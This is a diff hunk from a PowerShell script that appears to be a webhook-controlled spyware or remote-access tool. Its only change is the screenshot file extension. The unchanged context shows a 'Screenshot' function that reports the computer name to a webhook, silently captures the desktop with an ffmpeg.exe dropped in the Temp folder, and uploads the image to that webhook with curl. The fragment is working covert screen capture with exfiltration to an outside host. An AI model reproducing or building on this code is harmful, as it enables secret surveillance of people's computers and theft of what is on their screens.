@@ -905,7 +905,7 @@ Function Screenshot {
     $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Taking a screenshot..`` :arrows_counterclockwise:"} | ConvertTo-Json
     Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
     
-    $mkvPath = "$env:Temp\ScreenClip.png"
+    $mkvPath = "$env:Temp\ScreenClip.jpg"
     .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
     sleep 2
     curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
